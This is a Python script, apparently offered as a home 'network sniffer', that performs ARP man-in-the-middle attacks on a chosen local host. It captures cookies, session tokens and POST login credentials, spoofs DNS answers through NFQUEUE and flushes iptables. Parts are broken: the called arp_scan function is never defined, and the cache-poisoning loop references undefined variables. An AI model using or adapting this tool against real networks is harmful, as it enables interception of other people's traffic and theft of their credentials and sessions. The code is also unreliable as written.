#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes
import subprocess
import json
import re

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

# Custom DNS response database (can be expanded)
DNS_DB = {
    'google.com': '8.8.8.8',
    'facebook.com': '157.240.22.35',
}

# Capturing HTTP session cookies, tokens, and form data
class HTTP_SessionHijacker:
    @staticmethod
    def capture_http(pkt):
        if pkt.haslayer('Raw'):
            raw_data = pkt['Raw'].load.decode(errors='ignore')
            cookies = re.findall(r'Cookie: (.*?)\r\n', raw_data)
            tokens = re.findall(r'(session|token|auth)\s*=\s*([^;]+)', raw_data, re.IGNORECASE)
            
            # Capture cookies
            for cookie in cookies:
                print(f"{Fore.RED}Captured Cookie: {cookie}{Style.RESET_ALL}")
            
            # Capture session tokens
            for token in tokens:
                print(f"{Fore.YELLOW}Captured Token: {token[1]}{Style.RESET_ALL}")

            # Capture form data in POST requests
            if "POST" in raw_data:
                if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
                   any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
                    print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
                    for line in raw_data.split('\r\n'):
                        if '=' in line and len(line) < 100:
                            print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")

# DNS Spoofing Class
class DNS_Spoofer:
    @staticmethod
    def spoof_dns(pkt, spoof_ip):
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
            domain = pkt[DNS].qd.qname.decode('utf-8').strip('.')
            if domain in DNS_DB:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=DNS_DB[domain]))
                send(spoofed_pkt, iface=opts.iface, verbose=False)
                print(f'{Fore.RED}DNS Poison: Redirected {domain} to {DNS_DB[domain]}{Style.RESET_ALL}')

# DNS Cache Poisoning
class DNS_CachePoisoning:
    @staticmethod
    def start_dns_cache_poisoning(spoof_ip, interval=60):
        """ Periodically respoof DNS to maintain cache poisoning """
        while True:
            DNS_Spoofer.spoof_dns(pkt, spoof_ip)
            time.sleep(interval)  # Wait before respoofing

# Define the main device handler
class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53', store=0)

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        def arp_pkt_callback(pkt):
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=arp_pkt_callback,
              filter=f'arp and host {self.targetip}', store=0)

    def http_sniff(self):
        sniff(iface=self.iface, prn=HTTP_SessionHijacker.capture_http,
              filter=f'tcp port 80 and host {self.targetip}', store=0)

    def enable_ip_forwarding(self):
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')

    def set_iptables(self):
        subprocess.call(f"iptables --flush", shell=True)
        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')

    def dns_poison(self, spoof_ip):
        def dns_pkt_callback(pkt):
            DNS_Spoofer.spoof_dns(pkt, spoof_ip)

        # Import NetfilterQueue only if DNS poisoning is selected
        from netfilterqueue import NetfilterQueue
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, dns_pkt_callback)
        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
        nfqueue.run()

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
                self.dns_poison(spoof_ip)
            elif choice == 4:
                self.arp_sniff()
            elif choice == 5:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip == "0":
            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        device.enable_ip_forwarding()
        device.set_iptables()
        try:
            device.sniff()
        except KeyboardInterrupt:
            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
            continue
